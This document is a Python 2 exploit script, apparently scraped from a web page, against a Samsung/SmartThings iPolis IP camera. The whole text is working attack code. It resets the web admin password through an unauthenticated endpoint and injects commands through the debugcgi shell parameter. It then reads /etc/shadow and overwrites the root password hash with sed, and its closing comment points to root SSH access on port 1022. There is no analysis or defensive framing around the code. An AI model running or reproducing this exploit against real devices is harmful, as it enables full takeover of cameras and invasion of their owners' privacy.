 
import urllib, urllib2, crypt, time
 
# New password for web interface
web_password    = &#039;admin&#039;
# New password for root
root_password   = &#039;root&#039;
# IP of the camera
ip          = &#039;192.168.12.61&#039;
 
# These are all for the Smartthings bundled camera
realm = &#039;iPolis&#039;
web_username = &#039;admin&#039;
base_url = &#039;http://&#039; + ip + &#039;/cgi-bin/adv/debugcgi?msubmenu=shell&command=ls&command_arg=/...;&#039;
 
 
# Take a command and use command injection to run it on the device
def run_command(command):
    # Convert a normal command into one using bash brace expansion
    # Can&#039;t send spaces to debugcgi as it doesn&#039;t unescape
    command_brace = &#039;{&#039; + &#039;,&#039;.join(command.split(&#039; &#039;)) + &#039;}&#039;
    command_url = base_url + command_brace
 
    # HTTP digest auth for urllib2
    authhandler = urllib2.HTTPDigestAuthHandler()
    authhandler.add_password(realm, command_url, web_username, web_password)
    opener = urllib2.build_opener(authhandler)
    urllib2.install_opener(opener)
 
    return urllib2.urlopen(command_url)
 
# Step 1 - change the web password using the unauthed vuln found by zenofex
data = urllib.urlencode({ &#039;data&#039; : &#039;NEW;&#039; + web_password })
urllib2.urlopen(&#039;http://&#039; + ip + &#039;/classes/class_admin_privatekey.php&#039;, data)
 
# Need to sleep or the password isn&#039;t changed
time.sleep(1)
 
# Step 2 - find the current root password hash
shadow = run_command(&#039;cat /etc/shadow&#039;)
 
for line in shadow:
    if line.startswith(&#039;root:&#039;):
        current_hash = line.split(&#039;:&#039;)[1]
 
# Crypt the new password
new_hash = crypt.crypt(root_password, &#039;00&#039;)
 
# Step 3 - Use sed to search and replace the old for new hash in the passwd
# This is done because the command injection doesn&#039;t allow a lot of different URL encoded chars
run_command(&#039;sed -i -e s/&#039; + current_hash + &#039;/&#039; + new_hash + &#039;/g /etc/shadow&#039;)
 
# Step 4 - check that the password has changed
shadow = run_command(&#039;cat /etc/shadow&#039;)
 
for line in shadow:
    if line.startswith(&#039;root:&#039;):
        current_hash = line.split(&#039;:&#039;)[1]
 
if current_hash <> new_hash:
    print &#039;Error! - password not changed&#039;
 
# Step 5 - ssh to port 1022 with new root password!

